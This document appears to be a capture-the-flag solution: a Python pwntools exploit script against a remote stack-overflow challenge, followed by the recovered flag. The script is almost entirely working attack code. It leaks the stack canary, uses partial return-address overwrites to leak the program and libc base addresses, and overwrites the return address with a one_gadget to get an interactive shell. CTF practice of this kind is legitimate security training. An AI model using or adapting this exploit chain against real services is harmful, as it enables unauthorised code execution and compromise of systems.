
# warmup2.py

```py
from pwn import *

r = remote('warmup2.ctf.maplebacon.org', 1337)

r.readline()

p = cyclic(265)

r.send(p)

x = r.recv().split()[1][:-1][265:]

canary = int.from_bytes(x[:7], byteorder='little') << 8
stack = int.from_bytes(x[7:], byteorder='little')

print(f'Canary    : {hex(canary)}')

p = cyclic(264)
p += p64(canary)
p += b'AAAAAAAA'
p += b'\xdd'

r.send(p)

r.recv()

p = cyclic(280)

r.send(p)

r.recv()

x = r.recv().split()[1][:-1][280:]

BASE_ELF = int.from_bytes(x, byteorder='little') - 0x12DD - 5

print(f'Base_elf  : {hex(BASE_ELF)}')

p = cyclic(264)
p += p64(canary)
p += b'AAAAAAAA'
p += p64(BASE_ELF + 0x12DD)

r.send(p)

r.recv() 
r.recv()

p = cyclic(296)

r.send(p)

x = r.recv().split()[1][:-1][296:]

LIBC_BASE = int.from_bytes(x, byteorder='little') - 147587

print(f'Libc_base : {hex(LIBC_BASE)}') 

one_gadget = 0xe3b01

p = cyclic(264)
p += p64(canary)
p += b'AAAAAAAA'
p += p64(LIBC_BASE+one_gadget)

r.send(p)

r.interactive()
```

# FLAG

**`maple{we_have_so_much_in_common}`**

